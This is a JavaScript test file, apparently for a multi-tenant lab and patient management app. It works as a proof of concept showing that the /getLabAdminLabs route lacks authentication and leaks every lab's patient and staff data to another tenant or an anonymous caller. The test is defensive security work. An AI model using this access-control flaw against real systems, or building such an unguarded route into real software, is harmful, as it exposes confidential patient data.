import { describe, expect, it } from "vitest";
import { request } from "../helpers.js";

/**
 * EXPLOIT: cross-tenant data exposure via GET /getLabAdminLabs
 *
 * The route is mounted WITHOUT verifyToken and the handler aggregates the
 * ENTIRE database (all admins -> all labs -> all lab users + all patients)
 * with no filter on who is asking. So one lab admin (or an anonymous
 * attacker) can read every other lab's patients and staff.
 */
describe("SECURITY: /getLabAdminLabs leaks every lab's data", () => {
  async function signup(seed) {
    const res = await request.post("/labadmin/signup").send(seed);
    return res.body.token;
  }

  it("lets Lab B's admin (and anonymous users) read Lab A's patients", async () => {
    // --- Victim: Lab A, with a confidential patient -------------------------
    const tokenA = await signup({
      name: "Alice Admin",
      contact: "1111111111",
      username: "alice",
      password: "alicepass",
      labName: "Alice Diagnostics",
    });
    await request
      .post("/patient")
      .set("Authorization", `Bearer ${tokenA}`)
      .send({ patientName: "VICTIM-SECRET-PATIENT", gender: "female" });

    // --- Attacker: Lab B, a completely unrelated tenant --------------------
    const tokenB = await signup({
      name: "Mallory Admin",
      contact: "2222222222",
      username: "mallory",
      password: "mallorypass",
      labName: "Mallory Labs",
    });

    // 1) Attacker authenticated as Lab B reads the global dump.
    const asAttacker = await request
      .get("/getLabAdminLabs")
      .set("Authorization", `Bearer ${tokenB}`);

    // 2) And it works even with NO token at all.
    const asAnonymous = await request.get("/getLabAdminLabs");

    const leakedNames = (body) =>
      body.data
        .flatMap((admin) => admin.adminLabs ?? [])
        .flatMap((lab) => lab.labPatients ?? [])
        .map((p) => p.patientName);

    // The victim's patient is exposed to the attacker...
    expect(leakedNames(asAttacker.body)).toContain("VICTIM-SECRET-PATIENT");
    // ...and to anyone unauthenticated.
    expect(asAnonymous.status).toBe(200);
    expect(leakedNames(asAnonymous.body)).toContain("VICTIM-SECRET-PATIENT");
  });
});
